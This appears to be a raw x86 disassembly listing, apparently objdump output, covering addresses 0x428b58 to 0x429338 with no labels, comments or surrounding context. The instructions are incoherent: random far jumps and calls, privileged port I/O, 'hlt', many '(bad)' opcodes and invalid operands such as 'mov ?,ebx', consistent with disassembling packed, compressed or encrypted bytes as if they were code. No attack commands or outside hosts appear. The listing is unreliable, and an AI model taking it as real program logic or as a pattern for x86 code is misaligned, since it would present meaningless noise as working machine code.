  428b58:	xor    DWORD PTR [ebp+0x1d202538],ebp
  428b5e:	cmp    DWORD PTR [edi+0x33],esi
  428b61:	or     ecx,DWORD PTR [eax]
  428b63:	les    ecx,FWORD PTR [eax-0x540731eb]
  428b69:	inc    ebp
  428b6a:	jmp    0x5bcd:0xe20216b5
  428b71:	outs   dx,DWORD PTR ds:[esi]
  428b72:	shl    DWORD PTR [esp+eax*8],0x60
  428b76:	ins    BYTE PTR es:[edi],dx
  428b77:	adc    eax,edx
  428b79:	jo     0x428b5e
  428b7b:	sub    BYTE PTR [eax+0x6b],0x7c
  428b7f:	and    al,0xc2
  428b81:	xor    eax,0xd99d0ae4
  428b86:	pop    es
  428b87:	and    esi,DWORD PTR [eax-0x16]
  428b8a:	pop    ds
  428b8b:	ins    DWORD PTR es:[edi],dx
  428b8c:	jbe    0x428c03
  428b8e:	jb     0x428bae
  428b90:	call   0xd254:0x7ed550b8
  428b97:	gs js  0x428be5
  428b9a:	sbb    cl,BYTE PTR [esi-0x79]
  428b9d:	shr    DWORD PTR [ecx-0x20],0x3d
  428ba1:	inc    ecx
  428ba2:	lahf   
  428ba3:	test   al,0xb8
  428ba5:	or     dh,cl
  428ba7:	shl    BYTE PTR [eax-0x424ed806],cl
  428bad:	add    al,0xbf
  428baf:	repnz mov dl,0x72
  428bb2:	inc    ebx
  428bb3:	inc    ebx
  428bb4:	lods   eax,DWORD PTR ds:[esi]
  428bb5:	push   ebp
  428bb6:	push   0xfffffff5
  428bb8:	enter  0x9215,0xd5
  428bbc:	and    eax,0xf9a1786f
  428bc1:	fucom  st(1)
  428bc3:	cmp    DWORD PTR [ecx-0x5e3a63b],ecx
  428bc9:	pop    esp
  428bca:	dec    esp
  428bcb:	dec    esp
  428bcc:	mov    WORD PTR ss:[edi-0x10137706],cs
  428bd3:	jnp    0x428c3c
  428bd5:	mov    dl,0xd9
  428bd7:	in     al,dx
  428bd8:	mov    edi,edx
  428bda:	dec    ebp
  428bdb:	jne    0x428c4f
  428bdd:	gs mov al,0x3a
  428be0:	dec    ecx
  428be1:	test   DWORD PTR [edi],esi
  428be3:	aam    0x8e
  428be5:	ins    DWORD PTR es:[edi],dx
  428be6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428be7:	(bad)  
  428be8:	loope  0x428b98
  428bea:	lock test BYTE PTR [esi-0x70a8e0ce],0xe2
  428bf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428bf3:	outs   dx,BYTE PTR ds:[esi]
  428bf4:	lds    si,DWORD PTR [edx-0x46]
  428bf8:	mov    ?,ebx
  428bfa:	mov    es,WORD PTR [ecx+0x75c72ac8]
  428c00:	mov    dh,0x12
  428c02:	pusha  
  428c03:	pop    ebx
  428c04:	cmc    
  428c05:	xchg   ebx,eax
  428c06:	mov    ch,0xfc
  428c08:	jo     0x428c25
  428c0a:	add    DWORD PTR [esi+edi*2+0x2],ebp
  428c0e:	xor    eax,0x1fafb4c4
  428c13:	xor    DWORD PTR [edx+0x41],ebx
  428c16:	call   0x46d4:0x85c4149d
  428c1d:	jae    0x428c59
  428c1f:	jmp    0x428bbb
  428c21:	push   0xffffffcc
  428c23:	pop    edi
  428c24:	mov    DWORD PTR [ecx],edi
  428c26:	xor    al,0x27
  428c28:	push   ss
  428c29:	xchg   ebp,eax
  428c2a:	(bad)  
  428c2b:	cmp    al,0x94
  428c2d:	lea    esi,[ecx]
  428c2f:	es xchg esi,eax
  428c31:	add    ebx,ecx
  428c33:	inc    esp
  428c34:	mov    ch,BYTE PTR [ecx]
  428c36:	inc    ecx
  428c37:	(bad)  
  428c38:	cmp    cl,al
  428c3a:	and    esp,edi
  428c3c:	pop    ss
  428c3d:	mov    esp,DWORD PTR [eax+0x69]
  428c40:	cmp    dl,ch
  428c42:	and    eax,0xd5fd7212
  428c47:	aam    0x64
  428c49:	mov    cl,0xd
  428c4b:	mov    al,ds:0x40d01d39
  428c50:	push   esp
  428c51:	out    0x60,eax
  428c53:	jno    0x428c3e
  428c55:	jecxz  0x428cc6
  428c57:	sti    
  428c58:	mov    ah,0x8c
  428c5a:	dec    edx
  428c5b:	aad    0xe7
  428c5d:	clc    
  428c5e:	enter  0x148,0x2c
  428c62:	add    eax,0x1a7f8854
  428c67:	cwde   
  428c68:	std    
  428c69:	hlt    
  428c6a:	mov    al,0x24
  428c6c:	jle    0x428c70
  428c6e:	pop    esp
  428c6f:	xor    al,0xfe
  428c71:	and    DWORD PTR [eax+0x23],ecx
  428c74:	mov    dl,0x46
  428c76:	mov    bh,0xf
  428c78:	shl    BYTE PTR [edx],cl
  428c7a:	jp     0x428c03
  428c7c:	and    eax,0xa9d49891
  428c81:	push   ss
  428c82:	mov    dh,0x60
  428c84:	mov    al,0x2
  428c86:	shr    BYTE PTR [edx+0x10],cl
  428c89:	jnp    0x428d06
  428c8b:	sub    al,0xe4
  428c8d:	or     al,0xf8
  428c8f:	daa    
  428c90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428c91:	add    eax,DWORD PTR [edx]
  428c93:	hlt    
  428c94:	xor    al,0x18
  428c96:	inc    ebp
  428c97:	ins    BYTE PTR es:[edi],dx
  428c98:	add    BYTE PTR ds:0x1848d574,ah
  428c9e:	(bad)  
  428c9f:	out    0x96,eax
  428ca1:	jp     0x428c70
  428ca3:	push   ebp
  428ca4:	mov    BYTE PTR [ebx+0x43c46a77],bh
  428caa:	cdq    
  428cab:	jmp    0x7e53:0x305e029d
  428cb2:	out    dx,eax
  428cb3:	fsub   QWORD PTR [edx+0x7e]
  428cb6:	push   ds
  428cb7:	mov    bh,0xf0
  428cb9:	sub    BYTE PTR [esi+ebp*4],bl
  428cbc:	mov    esp,0xa9d5c5fe
  428cc1:	enter  0xb9d2,0x5f
  428cc5:	or     DWORD PTR [edi],edx
  428cc7:	mov    BYTE PTR cs:[edi-0x1b0448f0],cl
  428cce:	dec    edx
  428ccf:	loope  0x428d40
  428cd1:	add    eax,DWORD PTR [edx+eax*2-0x31]
  428cd5:	mov    ebp,0x7c0c01ec
  428cda:	fwait
  428cdb:	test   DWORD PTR [ecx],0x6a664303
  428ce1:	xor    ch,BYTE PTR [edx+eiz*1]
  428ce4:	xchg   esi,eax
  428ce5:	add    bl,BYTE PTR [eax+0x3b4eb0a0]
  428ceb:	xchg   edi,eax
  428cec:	jns    0x428c92
  428cee:	or     esi,DWORD PTR [edx]
  428cf0:	jge    0x428c7c
  428cf2:	pop    ds
  428cf3:	aas    
  428cf4:	out    0x2a,al
  428cf6:	ss dec ecx
  428cf8:	test   BYTE PTR [eax+0x7b],cl
  428cfb:	cdq    
  428cfc:	mov    ss,WORD PTR [esp+edi*1]
  428cff:	aam    0xda
  428d01:	jg     0x428cff
  428d03:	in     al,dx
  428d04:	in     eax,0x2c
  428d06:	pop    ds
  428d07:	out    0x26,eax
  428d09:	loop   0x428c9a
  428d0b:	jbe    0x428c96
  428d0d:	xchg   esp,eax
  428d0e:	aam    0xc6
  428d10:	add    edi,DWORD PTR ds:[ebp+edi*8-0x29ca368b]
  428d18:	outs   dx,DWORD PTR ds:[esi]
  428d19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428d1a:	data16 mov ch,0xb5
  428d1d:	lahf   
  428d1e:	and    eax,0xf4f5a185
  428d23:	push   ebp
  428d24:	inc    edi
  428d25:	daa    
  428d26:	ds cwde 
  428d28:	xor    eax,0x128959f7
  428d2d:	add    bl,BYTE PTR [edx+ebp*2-0x1f]
  428d31:	xor    dl,BYTE PTR [esi+0x60df4c2b]
  428d37:	in     eax,0x5a
  428d39:	sbb    dh,BYTE PTR [ebp+0x6f8ec290]
  428d3f:	aad    0x5f
  428d41:	call   0xd576b29e
  428d46:	push   edx
  428d47:	jle    0x428cd1
  428d49:	inc    edi
  428d4a:	jecxz  0x428d0c
  428d4c:	mov    eax,DWORD PTR [edi+0x248d3b9]
  428d52:	adc    al,dl
  428d54:	mov    edi,0x9a91cde5
  428d59:	pop    esi
  428d5a:	fs jnp 0x428d37
  428d5d:	popa   
  428d5e:	call   0xef33:0x1955d785
  428d65:	adc    edx,DWORD PTR [eax-0x77]
  428d68:	adc    BYTE PTR [esi],cl
  428d6a:	bound  edi,QWORD PTR [ecx+0x3c]
  428d6d:	sub    DWORD PTR [ebx-0x1c],eax
  428d70:	cmc    
  428d71:	imul   ebx,DWORD PTR [edx],0xfffffffb
  428d74:	mov    BYTE PTR [edi],cl
  428d76:	and    BYTE PTR [ecx+edi*1+0x7f],bh
  428d7a:	mov    eax,ebx
  428d7c:	inc    esi
  428d7d:	add    bl,BYTE PTR [esp+edx*4+0x43]
  428d81:	int    0x19
  428d83:	mov    BYTE PTR [esi],cl
  428d85:	mov    ecx,0x8cee071f
  428d8a:	lock ds and ah,bh
  428d8e:	and    esp,edx
  428d90:	sbb    bl,BYTE PTR es:0x3094b076
  428d97:	shl    BYTE PTR [ebp+0x3c],1
  428d9a:	or     edx,DWORD PTR [esi-0x77]
  428d9d:	or     esi,DWORD PTR [ebx-0xb]
  428da0:	jb     0x428de3
  428da2:	mov    eax,ds:0x4179087
  428da7:	cmp    bl,ch
  428da9:	hlt    
  428daa:	mov    dh,0x14
  428dac:	dec    esp
  428dad:	push   edx
  428dae:	xor    bl,BYTE PTR [edx-0x78]
  428db1:	sbb    edi,DWORD PTR [edi+0x14dd5e75]
  428db7:	or     DWORD PTR [eax-0x767abe56],0xffffff9d
  428dbe:	jg     0x428dcb
  428dc0:	js     0x428d9b
  428dc2:	pop    ebp
  428dc3:	std    
  428dc4:	mov    DWORD PTR ds:0xce29f928,ecx
  428dca:	xchg   BYTE PTR [edi-0x7a6ffd6d],cl
  428dd0:	and    BYTE PTR [edi+0x61],0xda
  428dd4:	pop    ebx
  428dd5:	lea    esp,[ebp-0x69]
  428dd8:	push   ds
  428dd9:	inc    ebx
  428dda:	pop    ebp
  428ddb:	and    BYTE PTR [edi],cl
  428ddd:	and    ebp,DWORD PTR ds:0xbe05afd9
  428de3:	add    eax,0x3374cb63
  428de8:	adc    eax,0x193f1f18
  428ded:	ss icebp 
  428def:	popf   
  428df0:	sbb    dl,BYTE PTR [ebx]
  428df2:	retf   
  428df3:	aam    0x10
  428df5:	enter  0x38fa,0x8c
  428df9:	and    eax,0x3589bf86
  428dfe:	ss sub eax,0xc229346d
  428e04:	repnz lock adc edx,esp
  428e08:	lock pop esp
  428e0a:	lods   eax,DWORD PTR ds:[esi]
  428e0b:	sbb    al,0x5d
  428e0d:	jnp    0x428db9
  428e0f:	jmp    0x299f:0x1a675d89
  428e16:	jmp    0xbed6:0xebe5f061
  428e1d:	push   ebp
  428e1e:	bnd js 0x428e73
  428e21:	push   edx
  428e22:	dec    ebp
  428e23:	hlt    
  428e24:	cmp    esi,DWORD PTR [esi+eax*1-0x39]
  428e28:	lock leave 
  428e2a:	add    DWORD PTR [edx+0x5700e5a8],ecx
  428e30:	es pop ds
  428e32:	fadd   QWORD PTR [esi-0x56]
  428e35:	adc    al,0xb9
  428e37:	cmp    al,0x8b
  428e39:	dec    esi
  428e3a:	ja     0x428dfe
  428e3c:	inc    eax
  428e3d:	xchg   ebx,eax
  428e3e:	retf   0x8a00
  428e41:	dec    ebp
  428e42:	inc    edi
  428e43:	out    dx,eax
  428e44:	loope  0x428e4d
  428e46:	inc    esi
  428e47:	leave  
  428e48:	jmp    0xcf85ee4c
  428e4d:	push   esi
  428e4e:	pop    ds
  428e4f:	std    
  428e50:	xor    eax,0x401a2566
  428e55:	mov    esi,0x3d6a1b1f
  428e5a:	sbb    eax,0x4578cc5c
  428e5f:	aad    0xfb
  428e61:	and    BYTE PTR [edx-0x694e968e],dh
  428e67:	mov    esi,0x8d32f88
  428e6c:	push   ebx
  428e6d:	xor    al,0xd
  428e6f:	clc    
  428e70:	mov    ds:0x162bd205,eax
  428e75:	xchg   esi,eax
  428e76:	sub    DWORD PTR [eax+0x4d],edi
  428e79:	jb     0x428e99
  428e7b:	dec    ecx
  428e7c:	jne    0x428e6c
  428e7e:	in     eax,dx
  428e7f:	ret    0xd46
  428e82:	xor    al,0xd7
  428e84:	enter  0x1d4d,0xd9
  428e88:	mov    eax,0x8842b134
  428e8d:	inc    ebx
  428e8e:	mov    ecx,0x5edd0b54
  428e93:	pop    esi
  428e94:	adc    al,BYTE PTR [edx]
  428e96:	enter  0x4b11,0x14
  428e9a:	iret   
  428e9b:	in     eax,dx
  428e9c:	adc    BYTE PTR [edx+0x1f],0xad
  428ea0:	and    BYTE PTR [ebx-0x6b],al
  428ea3:	jmp    0xd5c3c740
  428ea8:	sbb    eax,0x2110e2c0
  428ead:	in     al,dx
  428eae:	fmul   st,st(5)
  428eb0:	mov    DWORD PTR [ebx+0x3],esi
  428eb3:	loope  0x428e67
  428eb5:	and    BYTE PTR [edi+0x5602987a],0xb0
  428ebc:	adc    eax,0x2287d6f6
  428ec1:	bound  ebx,QWORD PTR [edi]
  428ec3:	jg     0x428e4a
  428ec5:	dec    ah
  428ec7:	pop    es
  428ec8:	mov    dl,0x9f
  428eca:	sbb    edx,edi
  428ecc:	in     eax,dx
  428ecd:	fisttp WORD PTR [edi+0x22927d16]
  428ed3:	out    0x6c,eax
  428ed5:	fwait
  428ed6:	pusha  
  428ed7:	loope  0x428f2e
  428ed9:	std    
  428eda:	sbb    ebp,esp
  428edc:	push   0xffffff87
  428ede:	and    al,0xd4
  428ee0:	and    eax,0xe42f5fc2
  428ee5:	sub    DWORD PTR [ecx+edi*1],0xffffff89
  428ee9:	xchg   ebp,eax
  428eea:	add    BYTE PTR [ebx-0x13a5d43b],0x69
  428ef1:	add    ch,BYTE PTR [esi+0x52]
  428ef4:	push   es
  428ef5:	xlat   BYTE PTR ds:[ebx]
  428ef6:	mov    cl,0x50
  428ef8:	jns    0x428f02
  428efa:	pusha  
  428efb:	mov    ebp,0x25dc95a7
  428f00:	add    al,BYTE PTR [ecx+0x7e]
  428f03:	sub    bl,BYTE PTR [eax+0x30]
  428f06:	dec    edi
  428f07:	das    
  428f08:	jl     0x428e8d
  428f0a:	jl     0x428f68
  428f0c:	add    eax,0x1c03604c
  428f11:	xchg   esi,eax
  428f12:	sbb    al,0x5a
  428f14:	sub    ebx,ebx
  428f16:	imul   DWORD PTR [esi]
  428f18:	call   0x2d25151f
  428f1d:	jle    0x428eee
  428f1f:	sbb    eax,0x671f19d5
  428f24:	cmc    
  428f25:	pop    esi
  428f26:	clc    
  428f27:	mov    ebp,0xc5acf5bf
  428f2c:	push   esi
  428f2d:	push   ds
  428f2e:	inc    edx
  428f2f:	fdivrp st(2),st
  428f31:	fdiv   QWORD PTR [edx+0x4a]
  428f34:	or     DWORD PTR [ecx-0x8690947],ebx
  428f3a:	std    
  428f3b:	mov    edi,ss
  428f3d:	inc    ebp
  428f3e:	mov    eax,0x6b721299
  428f43:	aad    0x1f
  428f45:	fidiv  DWORD PTR [ebx]
  428f47:	xchg   esp,eax
  428f48:	scas   eax,DWORD PTR es:[edi]
  428f49:	cdq    
  428f4a:	xchg   BYTE PTR [eax-0x49a9ac64],bh
  428f50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428f51:	je     0x428f72
  428f53:	leave  
  428f54:	pop    ss
  428f55:	imul   ebp,DWORD PTR [ecx-0x7ffa1641],0xed556cf5
  428f5f:	aas    
  428f60:	add    bl,BYTE PTR [ebp+0x2983a744]
  428f66:	pop    ds
  428f67:	dec    ebp
  428f68:	or     cl,BYTE PTR [edx+ebp*8-0x2e]
  428f6c:	loopne 0x428f92
  428f6e:	(bad)  
  428f6f:	fidivr WORD PTR [ebp+0x552be6a9]
  428f75:	and    bl,BYTE PTR [edi]
  428f77:	aad    0x33
  428f79:	repz and ah,BYTE PTR [eax]
  428f7c:	xor    BYTE PTR fs:[eax-0x7cbafe2b],dh
  428f83:	bound  ecx,QWORD PTR [edi-0x3e]
  428f86:	mov    eax,ds:0x4f0f5571
  428f8b:	cmc    
  428f8c:	mov    eax,0x8d21e756
  428f91:	add    bl,ah
  428f93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428f94:	sub    BYTE PTR [ebx+edx*4],bl
  428f97:	stc    
  428f98:	mov    ds:0x88eb1620,eax
  428f9d:	mov    bl,0xe9
  428f9f:	(bad)  
  428fa0:	(bad)  
  428fa1:	pop    eax
  428fa2:	sahf   
  428fa3:	rcr    ebx,cl
  428fa5:	add    al,dh
  428fa7:	push   esi
  428fa8:	iret   
  428fa9:	je     0x428fab
  428fab:	cs scas eax,DWORD PTR es:[edi]
  428fad:	push   cs
  428fae:	ins    DWORD PTR es:[edi],dx
  428faf:	and    cl,al
  428fb1:	cmp    BYTE PTR [eax+eax*4-0x54960fdc],ch
  428fb8:	rol    BYTE PTR [edx+0x49],cl
  428fbb:	enter  0x4278,0x68
  428fbf:	cwde   
  428fc0:	and    al,BYTE PTR [edx+0x6c]
  428fc3:	popa   
  428fc4:	jge    0x428fc1
  428fc6:	(bad)  
  428fc7:	sbb    eax,0x2ea07369
  428fcc:	bound  ecx,QWORD PTR [ebx+eiz*1-0x482e49e9]
  428fd3:	aad    0x32
  428fd5:	dec    ebx
  428fd6:	test   al,0x41
  428fd8:	jmp    0x429046
  428fda:	out    dx,eax
  428fdb:	adc    eax,0x3658037f
  428fe0:	mov    al,ds:0x1ccd51cc
  428fe5:	pop    ds
  428fe6:	ss jmp 0x429028
  428fe9:	pop    edi
  428fea:	imul   edx,DWORD PTR [esi],0x860dc4e
  428ff0:	pop    es
  428ff1:	add    BYTE PTR [edi],bl
  428ff3:	mov    ch,0x22
  428ff5:	shl    DWORD PTR [eax],cl
  428ff7:	cmp    al,0x17
  428ff9:	pop    edx
  428ffa:	mov    ah,0x5d
  428ffc:	out    0xb4,al
  428ffe:	pusha  
  428fff:	ja     0x42902c
  429001:	test   DWORD PTR cs:[esi+0x431f15ef],eax
  429008:	ins    BYTE PTR es:[edi],dx
  429009:	shl    DWORD PTR [ebx],cl
  42900b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42900c:	xchg   esi,eax
  42900d:	and    eax,0x4ec9d46b
  429012:	push   eax
  429013:	dec    edi
  429014:	test   eax,0x40e98267
  429019:	loope  0x42907b
  42901b:	sub    edi,DWORD PTR [ecx-0x13]
  42901e:	test   eax,0xeb01b8a2
  429023:	fwait
  429024:	pop    edx
  429025:	ja     0x429098
  429027:	push   ebp
  429028:	adc    BYTE PTR [eax],dh
  42902a:	mov    ebx,0x6533313b
  42902f:	jne    0x429092
  429031:	and    esi,DWORD PTR [edi+0x48]
  429034:	arpl   bx,sp
  429036:	mov    eax,0x2a05fe34
  42903b:	mov    eax,0x96df2e23
  429040:	cmp    edx,DWORD PTR [ebx-0x758d78a0]
  429046:	mov    edx,0xa2c1b0de
  42904b:	aad    0x66
  42904d:	or     eax,0xe3768793
  429052:	(bad)  
  429053:	cli    
  429054:	lea    esi,[ecx]
  429056:	clc    
  429057:	xor    dl,BYTE PTR [ebx+0x8c520ff]
  42905d:	aas    
  42905e:	ret    0xf092
  429061:	dec    ecx
  429062:	jbe    0x429039
  429064:	(bad)
  429067:	repz bound ebp,QWORD PTR [eax+0x30]
  42906b:	aam    0xc2
  42906d:	bound  edi,QWORD PTR [ecx-0x23]
  429070:	fist   WORD PTR [ebx+0x2a]
  429073:	ds jns 0x4290b1
  429076:	call   0x823c:0x941d04cb
  42907d:	sbb    al,0x9c
  42907f:	in     eax,0x4
  429081:	ror    al,cl
  429083:	jmp    0x912e934e
  429088:	mov    al,0xd4
  42908a:	ss xchg ebp,eax
  42908c:	inc    ecx
  42908d:	call   0xe36367f2
  429092:	xor    cl,al
  429094:	adc    BYTE PTR [esp+esi*2-0x4dc8212c],cl
  42909b:	push   ss
  42909c:	push   ebp
  42909d:	jne    0x4290b1
  42909f:	push   es
  4290a0:	jmp    0x662b5fb4
  4290a5:	cdq    
  4290a6:	shl    al,cl
  4290a8:	xor    BYTE PTR [eax],al
  4290aa:	cwde   
  4290ab:	mov    cl,bl
  4290ad:	or     BYTE PTR [ebx+0x1305804b],bh
  4290b3:	daa    
  4290b4:	push   ebx
  4290b5:	push   es
  4290b6:	icebp  
  4290b7:	push   ss
  4290b8:	mov    ds:0x7b3ade02,al
  4290bd:	inc    esi
  4290be:	or     dl,BYTE PTR [edx-0x71]
  4290c1:	retf   0xeb66
  4290c4:	mov    eax,ds:0x1d4fa6ce
  4290c9:	xchg   edx,eax
  4290ca:	xchg   esi,eax
  4290cb:	test   eax,0x128402a3
  4290d0:	jo     0x429068
  4290d2:	cwde   
  4290d3:	icebp  
  4290d4:	imul   ebp,ebx,0x2f06995
  4290da:	addr16 mov cl,0x3f
  4290dd:	fisub  WORD PTR [eax]
  4290df:	mov    BYTE PTR [ebx+ecx*4],bh
  4290e2:	jae    0x4290d7
  4290e4:	mov    BYTE PTR [ecx-0x404bcff9],ah
  4290ea:	cwde   
  4290eb:	pop    esi
  4290ec:	test   eax,0xafd96764
  4290f1:	repnz dec edi
  4290f3:	and    cl,BYTE PTR [ecx+0x50acd472]
  4290f9:	add    esp,DWORD PTR [edx-0x34]
  4290fc:	(bad)  
  4290fd:	jns    0x42912a
  4290ff:	push   ecx
  429100:	cli    
  429101:	leave  
  429102:	adc    al,0x9e
  429104:	mov    esi,DWORD PTR [ebx+0x52e02dc0]
  42910a:	ds mov dh,0x40
  42910d:	dec    edi
  42910e:	cmp    bh,dl
  429110:	push   0x3de8ccfb
  429115:	pop    edi
  429116:	xor    eax,0xc4378150
  42911b:	push   DWORD PTR [edi]
  42911d:	inc    edi
  42911e:	lahf   
  42911f:	cld    
  429120:	push   0x37
  429122:	retf   0xf9d3
  429125:	iret   
  429126:	out    0x7e,al
  429128:	lock adc BYTE PTR [edi],cl
  42912b:	sub    esp,0x47bd7d3c
  429131:	xchg   esp,eax
  429132:	mov    esp,0x1a428dd4
  429137:	or     DWORD PTR [ebp+0x13096e05],esp
  42913d:	push   ecx
  42913e:	fsubr  DWORD PTR [ebp-0x6]
  429141:	cmp    ch,BYTE PTR [ebp+0x19]
  429144:	sub    al,0xe9
  429146:	inc    edx
  429147:	add    al,0x68
  429149:	or     al,0x7
  42914b:	jl     0x4290cf
  42914d:	loop   0x4290e2
  42914f:	aam    0x20
  429151:	mov    ch,BYTE PTR ds:0x56107d16
  429157:	and    al,0xb5
  429159:	out    0x36,eax
  42915b:	ror    BYTE PTR [ecx],1
  42915d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42915e:	fwait
  42915f:	(bad)  
  429160:	mov    dh,0xb6
  429162:	jbe    0x429138
  429164:	jge    0x42912d
  429166:	pop    esp
  429167:	add    edi,DWORD PTR [ebx]
  429169:	or     eax,0xc589da55
  42916e:	je     0x42911e
  429170:	push   eax
  429171:	lods   al,BYTE PTR ds:[esi]
  429172:	leave  
  429173:	lods   al,BYTE PTR ds:[esi]
  429174:	pop    ebp
  429175:	add    ebx,DWORD PTR [eax+0x1afaa3a2]
  42917b:	(bad)  
  42917c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42917d:	dec    ebp
  42917e:	pop    ds
  42917f:	and    edx,edi
  429181:	retf   
  429182:	and    DWORD PTR [edx],ebx
  429184:	mov    dh,0xf5
  429186:	jnp    0x42915d
  429188:	paddw  mm3,QWORD PTR [ecx+0x2]
  42918c:	mov    edi,0x8e5e8f2c
  429191:	cmovns edx,DWORD PTR [eax+ecx*8+0x18]
  429196:	enter  0x3c14,0x6e
  42919a:	or     edi,edx
  42919c:	loopne 0x42919a
  42919e:	or     ecx,DWORD PTR [ebx+ebx*1+0x6dd61c23]
  4291a5:	dec    esi
  4291a6:	pop    ds
  4291a7:	jge    0x4291cd
  4291a9:	push   esi
  4291aa:	imul   ebx,edi,0x270998a3
  4291b0:	loop   0x42914b
  4291b2:	pusha  
  4291b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4291b4:	das    
  4291b5:	mov    ds:0x2e97ae41,eax
  4291ba:	popf   
  4291bb:	outs   dx,DWORD PTR ds:[esi]
  4291bc:	inc    ebx
  4291bd:	pop    ds
  4291be:	loope  0x4291f2
  4291c0:	inc    ebp
  4291c1:	out    0x16,eax
  4291c3:	(bad)  [eax-0x44]
  4291c6:	mov    al,0x4a
  4291c8:	mov    DWORD PTR [ecx],edi
  4291ca:	sbb    BYTE PTR [ebx],ah
  4291cc:	push   ds
  4291cd:	pop    esp
  4291ce:	dec    esp
  4291cf:	and    ah,BYTE PTR [esi]
  4291d1:	add    eax,eax
  4291d3:	sbb    DWORD PTR [ebx],eax
  4291d5:	ins    DWORD PTR es:[edi],dx
  4291d6:	cmp    al,dh
  4291d8:	inc    esi
  4291d9:	and    DWORD PTR [eax+0x73],0xffffffcb
  4291dd:	das    
  4291de:	sub    dl,BYTE PTR [edx-0x2a56b906]
  4291e4:	mov    ebx,0xeac5480b
  4291e9:	lock outs dx,DWORD PTR ds:[esi]
  4291eb:	out    dx,al
  4291ec:	mov    ebx,?
  4291ee:	(bad)  
  4291ef:	mov    ebx,DWORD PTR fs:[edi]
  4291f2:	out    0x55,eax
  4291f4:	cmp    BYTE PTR [edx-0x70],ah
  4291f7:	aam    0xa
  4291f9:	lahf   
  4291fa:	or     DWORD PTR [ebx],0x9ed2abfd
  429200:	mov    DWORD PTR [ecx+0x1b],edi
  429203:	(bad)  
  429204:	sub    ebx,DWORD PTR [esp+eiz*8-0x49]
  429208:	xor    DWORD PTR [ebp-0x1],0x59
  42920c:	call   0xf142:0x89688f93
  429213:	cmp    dl,BYTE PTR [ecx+0x4e]
  429216:	inc    ebp
  429217:	push   ebx
  429218:	mov    cl,0xfb
  42921a:	cld    
  42921b:	imul   eax,DWORD PTR [ebx],0x886bc29e
  429221:	sbb    al,0xd4
  429223:	jmp    0x209a:0xda60292
  42922a:	adc    al,0x7f
  42922c:	cmc    
  42922d:	adc    dl,BYTE PTR [eax-0x7be35a53]
  429233:	jl     0x429280
  429235:	dec    dh
  429237:	test   esi,esi
  429239:	aam    0x49
  42923b:	lods   eax,DWORD PTR ds:[esi]
  42923c:	add    eax,0xe8c34599
  429241:	test   DWORD PTR [eax+eiz*8],edx
  429244:	rol    BYTE PTR [edi],0x7f
  429247:	test   BYTE PTR [eax-0x3c0eabb9],0x81
  42924e:	sbb    esi,DWORD PTR [ecx+0x2]
  429251:	add    edx,DWORD PTR [edx+0x2438b96d]
  429257:	jecxz  0x429207
  429259:	pop    esi
  42925a:	pop    ds
  42925b:	lahf   
  42925c:	aas    
  42925d:	aas    
  42925e:	and    al,0xb4
  429260:	push   ecx
  429261:	pop    ebx
  429262:	mov    ds:0x6788963d,al
  429267:	popa   
  429268:	inc    edi
  429269:	stc    
  42926a:	jl     0x429240
  42926c:	inc    ebx
  42926d:	in     al,0xe4
  42926f:	in     al,dx
  429270:	mov    DWORD PTR [edi],esi
  429272:	jno    0x429247
  429274:	test   BYTE PTR [ecx-0x7],al
  429277:	or     dh,al
  429279:	push   cs
  42927a:	jmp    0x48d5:0xe06dc88a
  429281:	fs (bad) 
  429283:	into   
  429284:	sbb    eax,0xffd51e15
  429289:	(bad)  [ebx-0x3b]
  42928c:	test   al,0xa1
  42928f:	aad    0xb5
  429291:	in     eax,0xe3
  429293:	scas   eax,DWORD PTR es:[edi]
  429294:	xchg   BYTE PTR fs:[edx+0x70],ah
  429298:	ins    DWORD PTR es:[edi],dx
  429299:	mov    bl,0xf8
  42929b:	sbb    eax,0xbfbff4b5
  4292a0:	daa    
  4292a1:	push   edx
  4292a2:	mov    WORD PTR [edi],es
  4292a4:	push   ds
  4292a5:	add    dl,dl
  4292a7:	sbb    al,0x61
  4292a9:	call   0x2b6e:0xba6941e1
  4292b0:	int3   
  4292b1:	inc    ebp
  4292b2:	ja     0x4292d3
  4292b4:	or     esi,ecx
  4292b6:	aad    0x98
  4292b8:	jae    0x4292bc
  4292ba:	cmp    dl,bl
  4292bc:	test   al,0x61
  4292be:	xor    eax,DWORD PTR ds:0x636520be
  4292c4:	mov    bh,0x99
  4292c6:	ins    BYTE PTR es:[edi],dx
  4292c7:	add    al,0x21
  4292c9:	and    bh,ch
  4292cb:	dec    eax
  4292cc:	inc    eax
  4292cd:	add    esi,DWORD PTR [esi]
  4292cf:	and    ecx,ebp
  4292d1:	mov    ds:0x8368d89f,al
  4292d6:	pop    ds
  4292d7:	xchg   ebp,eax
  4292d8:	pop    esi
  4292d9:	mov    ch,0x2
  4292db:	adc    DWORD PTR fs:[ecx],esp
  4292de:	push   0x6729fd5d
  4292e3:	xchg   ebx,eax
  4292e4:	and    bh,dh
  4292e6:	shr    BYTE PTR [edi],cl
  4292e8:	or     al,0x3
  4292ea:	xchg   BYTE PTR ds:0xa0648ab9,ah
  4292f0:	mov    BYTE PTR [ecx+0xc],bl
  4292f3:	cmp    al,0x71
  4292f5:	xor    DWORD PTR ds:0x8c008642,0x7c
  4292fc:	mov    bh,0x90
  4292fe:	imul   ecx,DWORD PTR [ebx+0x35],0xffffffe3
  429302:	jb     0x429354
  429304:	xchg   DWORD PTR [ecx],edx
  429306:	xor    BYTE PTR [eax+0x36],bh
  429309:	test   bh,bh
  42930b:	leave  
  42930c:	sub    dh,BYTE PTR [edx+0x1bfad5d4]
  429312:	stos   DWORD PTR es:[edi],eax
  429313:	pop    ebx
  429314:	ficomp WORD PTR [ebp+0x7188e169]
  42931a:	mov    DWORD PTR [ebx-0x8d89026],edi
  429320:	fadd   DWORD PTR ds:0xb548cc7c
  429326:	xor    eax,0x1e5576f2
  42932b:	push   edi
  42932c:	pop    es
  42932d:	pop    esi
  42932e:	paddusw mm0,QWORD PTR [eax-0x6164e49e]
  429335:	cmp    al,0xa5
  429337:	push   ebp
  429338:	aas    
